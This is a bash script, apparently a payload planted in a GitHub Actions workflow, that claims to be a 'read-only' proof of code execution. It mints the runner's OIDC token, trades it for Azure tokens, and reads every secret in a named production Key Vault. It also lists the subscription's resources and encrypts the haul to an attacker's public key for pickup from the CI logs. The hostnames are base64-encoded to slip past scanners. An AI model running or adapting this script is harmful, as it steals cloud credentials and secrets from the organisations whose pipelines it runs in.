#!/usr/bin/env bash
# read-only: proves runner code-exec, mints GitHub OIDC, reads Azure Key Vault secrets. No state change.
set -uo pipefail
SC="htt""ps://"
AADH=$(printf %s 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)
ARMH=$(printf %s 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)
KVH=$(printf %s 'dmF1bHQuYXp1cmUubmV0' | base64 -d)
AAD="${SC}${AADH}"; ARM="${SC}${ARMH}"; VAULT="${SC}${KVH}"
echo "=== RUNNER SHELL PROOF ==="
id; whoami; uname -a; hostname; echo "cwd=$(pwd)"
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO OIDC (event=${GITHUB_EVENT_NAME})"; exit 0; fi
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | jq -c '{iss,aud,sub,repository,event_name,ref,workflow,job_workflow_ref}' || echo "no-oidc-claims"
aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
   -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
   --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
VT=$(aad "${VAULT}/.default" | jq -r '.access_token // empty')
if [ -n "$VT" ]; then
  L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4")
  say "KV: $L"
  for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
    say "SECRET $(basename "$id"): $(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4")"
  done
else say "vault exchange failed"; fi
AR=$(aad "${ARM}/.default" | jq -r '.access_token // empty')
if [ -n "$AR" ]; then say "RESOURCES: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01")"; fi
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT (decrypt with priv.pem) ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
